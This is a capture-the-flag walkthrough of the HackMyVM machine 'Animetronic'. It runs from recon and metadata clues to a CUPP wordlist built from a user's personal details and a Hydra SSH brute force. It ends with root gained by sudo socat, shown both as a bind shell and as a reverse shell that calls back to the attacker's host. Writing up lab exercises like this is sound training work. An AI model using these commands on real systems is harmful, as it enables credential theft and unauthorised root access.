@@ -1,0 +1,288 @@
+---
+title: Animetronic
+date: '2025-10-19'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - LINUX
+cover: /mc/uploads/2025/10/Screenshot-2025-10-19-133554.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+*Hey brooders! another HackMyVM machine. This one's called "Animetronic" and it's rated as easy. Let's dive in!*
+
+## Recon
+
+First things first - let's see what we're working with. I ran an `nmap `scan to check for open ports:
+
+```bash
+ζ nmap -sCV 192.168.138.127                                                                                        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 08:19 EDT
+Nmap scan report for 192.168.138.127
+Host is up (0.0012s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
+|_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Animetronic
+MAC Address: 08:00:27:B9:DB:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
+```
+
+so we have 2 ports open 80 and 22 , Since port 80 is open, I started fuzzing for hidden directories using Gobuster:
+
+## Fuzzing
+
+we gonna use Gobuster
+
+```bash
+ζ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.138.127/
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 316] [--> http://192.168.138.127/img/]
+/css                  (Status: 301) [Size: 316] [--> http://192.168.138.127/css/]
+/js                   (Status: 301) [Size: 315] [--> http://192.168.138.127/js/]
+/staffpages           (Status: 301) [Size: 323] [--> http://192.168.138.127/staffpages/]
+```
+
+Found a interesting directory: `/staffpages`.
+
+```bash
+ζ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.138.127/staffpages
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/new_employees        (Status: 200) [Size: 159577]
+```
+
+When I checked it out, there was another endpoint called `/new_employees` with an image file.
+
+[![](https://nutzh.top/wp-content/uploads/2025/10/Screenshot-2025-10-19-133554.png)](https://nutzh.top/wp-content/uploads/2025/10/Screenshot-2025-10-19-133554.png)I used `exiftool` to check the image's metadata (that's the hidden information stored in image files), and found a Base64 encoded comment:
+
+```bash
+ζ exiftool new_employees.jpeg
+
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
+Image Width                     : 703
+Image Height                    : 1136
+
+```
+
+here as we can see there is a comment encoded to Base64 so we gonna try to decode it
+
+```bash
+ζ echo "ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=" | base64 -d 
+                                         
+ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝ
+```
+
+Got some weird upside-down text: ***ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝ***
+
+After staring at it for a bit, I realized it said "message\_for\_michael" but written upside-down ! So I checked:
+
+```bash
+ζ curl http://192.168.138.127/staffpages/message_for_michael                                                       
+Hi Michael
+
+Sorry for this complicated way of sending messages between us.
+This is because I assigned a powerful hacker to try to hack
+our server.
+
+By the way, try changing your password because it is easy
+to discover, as it is a mixture of your personal information
+contained in this file 
+
+personal_info.txt
+```
+
+The message said Michael's password was weak and pointed to `personal_info.txt` which contained his personal details .
+
+```bash
+ζ curl http://192.168.138.127/staffpages/personal_info.txt                                                         
+name: Michael
+
+age: 27
+
+birth date: 19/10/1996
+
+number of children: 3 " Ahmed - Yasser - Adam "
+
+Hobbies: swimming
+```
+
+I used all that personal info to generate a custom password list with ***CUPP***
+
+```bash
+ζ cupp -i
+ ___________ 
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\   
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don't know all the info, just hit enter when asked! ;)
+
+> First Name: Michael
+> Surname: 
+> Nickname: 
+> Birthdate (DDMMYYYY): 19101996
+
+> Partners) name: 
+> Partners) nickname: 
+> Partners) birthdate (DDMMYYYY): 
+
+> Child's name: ahmed
+> Child's nickname: 
+> Child's birthdate (DDMMYYYY): 
+
+> Pet's name: 
+> Company name: 
+
+> Do you want to add some key words about the victim? Y/[N]: Y
+> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: swimming
+> Do you want to add special chars at the end of words? Y/[N]: 
+> Do you want to add some random numbers at the end of words? Y/[N]:
+> Leet mode? (i.e. leet = 1337) Y/[N]: 
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to michael.txt, counting 364 words.
+[+] Now load your pistolero with michael.txt and shoot! Good luck!
+```
+
+then ran Hydra to brute force SSH:
+
+```bash
+ζ hydra -l michael -P michael.txt ssh://192.168.138.127                                                            
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-19 08:44:02
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 364 login tries (l:1/p:364), ~23 tries per task
+[DATA] attacking ssh://192.168.138.127:22/
+[STATUS] 265.00 tries/min, 265 tries in 00:01h, 101 to do in 00:01h, 14 active
+[22][ssh] host: 192.168.138.127   login: michael   password: leahcim1996
+```
+
+so we have the credentials about the User michael
+
+## Initial access
+
+Logged into Michael's account
+
+```bash
+ζ ssh michael@192.168.138.127 
+michael@animetronic:~$ ls
+michael@animetronic:~$ pwd
+/home/michael
+michael@animetronic:~$ cd ..
+michael@animetronic:/home$ ls
+henry  michael
+michael@animetronic:/home$ cd henry/
+michael@animetronic:/home/henry$ ls
+Note.txt  user.txt
+
+```
+
+I could already read files in another user Henry's directory. Found a note with another Base64 string:
+
+```bash
+michael@animetronic:/home/henry$ cat Note.txt 
+if you need my account to do anything on the server,
+you will find my password in file named
+
+aGVucnlwYXNzd29yZC50eHQK
+michael@animetronic:/home/henry$ echo "aGVucnlwYXNzd29yZC50eHQK" |base64 -d
+henrypassword.txt
+```
+
+Used the `find` command to locate this file and found Henry's password: `IHateWilliam`
+
+```bash
+michael@animetronic:/home/henry$ find / -name 'henrypassword.txt' -type f 2>/dev/null
+/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
+michael@animetronic:/home/henry$ cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
+IHateWilliam
+```
+
+Switched to Henry's account and checked what he could run with sudo:
+
+```bash
+michael@animetronic:/home/henry$ su henry
+Password: 
+henry@animetronic:~$ sudo -l
+Matching Defaults entries for henry on animetronic:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User henry may run the following commands on animetronic:
+    (root) NOPASSWD: /usr/bin/socat
+```
+
+## Priv Esc
+
+Since Henry can run `socat` as root, getting root access is pretty straightforward. We've got two main approaches:  
+**Option 1 - Bind Shell:** Set up a listener on the target and connect to it from Kali   
+**Option 2 - Reverse Shell:** Set up a listener on Kali and have the target connect back to you.  
+Both methods work great
+
+### Bind Shell
+
+With a bind shell, we set up the listener directly on the target machine:
+
+```bash
+henry@animetronic:~$ sudo socat TCP-LISTEN:1234 EXEC:/bin/bash
+```
+
+**On our Kali machine**, we connect to that listener:
+
+```bash
+ζ nc 192.168.138.127 1234                               
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Reverse Shell
+
+For a reverse shell, we flip the setup. First, **we start a listener on our Kali machine**:
+```bash
+ζ socat TCP-LISTEN:1234 STDOUT
+```
+Then **on the target**, we initiate the connection back to our listener:
+
+```bash
+henry@animetronic:~$ sudo socat TCP:192.168.138.102:1234 EXEC:/bin/bash
+```
+
+Once the connection is established, we get our root shell on the Kali side and can grab the flag!
+
+```bash
+ζ socat TCP-LISTEN:1234 STDOUT                          
+2025/10/19 09:13:27 socat[21378] W address is opened in read-write mode but only supports write-only
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+> **ROOTED**
+
